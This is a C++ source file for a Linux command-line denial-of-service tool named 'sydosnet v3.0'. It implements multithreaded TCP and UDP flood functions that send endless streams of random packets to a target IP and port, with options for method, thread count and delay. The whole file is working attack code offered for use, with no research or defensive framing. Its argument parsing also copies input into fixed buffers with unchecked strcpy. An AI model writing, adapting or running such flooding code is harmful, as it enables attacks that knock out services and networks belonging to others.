/* This is Linux only */

#include<iostream>
#include<unistd.h>
#include<cstring>
#include<thread>
#include<sys/socket.h>
#include<sys/types.h>
#include<arpa/inet.h>

char target_ip[16];
int target_port = 0;
int attack_thread = 0;
char attack_method[4]{0};
int attack_delay = 0;

void tcpflood(const char* ip, int port, int delay)
{
    sockaddr_in target{0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(ip);
    target.sin_port = htons(port);

    char packet[1024];
    for(int i = 0; i < 1024; i++) {
        packet[i] = rand();
    }

    while(true)
    {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
        send(sock, packet, sizeof(packet), 0);
        close(sock);
        usleep(delay * 1000);
    }
}

void udpflood(const char* ip, int port, int delay)
{
    sockaddr_in target{0};
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(ip);
    target.sin_port = htons(port);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    char packet[1024]{0};
    for(int i = 0; i < 1024; i++) {
        packet[i] = rand();
    }

    while(true) {
        sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
        usleep(delay * 1000);
    }
}

void create_thread()
{
    if(strcmp(attack_method, "tcp") == 0) {
        for(int i = 0; i < attack_thread; i++) {
            std::thread(tcpflood, target_ip, target_port, attack_delay).detach();
        }
    }


    else if(strcmp(attack_method, "udp") == 0) {
        for(int i = 0; i < attack_thread; i++) {
            std::thread(udpflood, target_ip, target_port, attack_delay).detach();
        }
    }
}

int main(int argc, char** argv)
{
    for(int i = 0; i < argc; i++)
    {
        /* Show Version */
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0)
        {
            std::cout << "                                                                " << std::endl;
            std::cout << " |                        | version |                         | " << std::endl;
            std::cout << " |                   sydosnet v3.0 release                    | " << std::endl;
            std::cout << " |                      made by SeungYup                      | " << std::endl;
            std::cout << " |                                                            | " << std::endl;
            std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
            std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
            std::cout << "                                                                " << std::endl;

            return 0;
        }

        /* Show Help */
        else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
        {
            std::cout << "                                                                " << std::endl;
            std::cout << " |                          | help |                          | " << std::endl;
            std::cout << " |                -v,                                         | " << std::endl;
            std::cout << " |                  --version  show version                   | " << std::endl;
            std::cout << " |                -i,                                         | " << std::endl;
            std::cout << " |                  --ip  set target ip                       | " << std::endl;
            std::cout << " |                -p,                                         | " << std::endl;
            std::cout << " |                  --port  set target port                   | " << std::endl;
            std::cout << " |                -th,                                        | " << std::endl;
            std::cout << " |                  --thread  set attack thread               | " << std::endl;
            std::cout << " |                -m,                                         | " << std::endl;
            std::cout << " |                  --method  set attack method               | " << std::endl;
            std::cout << " |                -d,                                         | " << std::endl;
            std::cout << " |                  --delay  set attack delay                 | " << std::endl;
            std::cout << " |                                                            | " << std::endl;
            std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
            std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
            std::cout << "                                                                " << std::endl;

            return 0;
        }

        /* Set Target IP */
        else if(strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--ip") == 0) {
            strcpy(target_ip, argv[i+1]);
        }

        /* Set Target Port */
        else if(strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
            target_port = atoi(argv[i+1]);
        }

        /* Set Attack Thread */        
        else if(strcmp(argv[i], "-th") == 0 || strcmp(argv[i], "--thread") == 0) {
            attack_thread = atoi(argv[i+1]);
        }

        /* Set Attack Method */
        else if(strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--method") == 0)
        {
            strcpy(attack_method, argv[i+1]);
        }

        /* Set Attack Delay */
        else if(strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--delay") == 0)
        {
            attack_delay = atoi(argv[i+1]);
        }
    }

    /* IP is null */
    if(strcmp(target_ip, "") == 0) {
        std::cout << " E: target ip address is null " << std::endl;
        return 1;
    }

    /* Port is null */
    if(target_port == 0) {
        std::cout << " E: target port is 0 " << std::endl;
        return 1;
    }

    /* Thread is null */
    if(attack_thread == 0) {
        std::cout << " E: attack thread is 0 " << std::endl;
        return 1;
    }

    create_thread();

    std::cout << " press ctrl+c or enter key to exit ... " << std::endl;
    std::cin.get();
    return 0;
}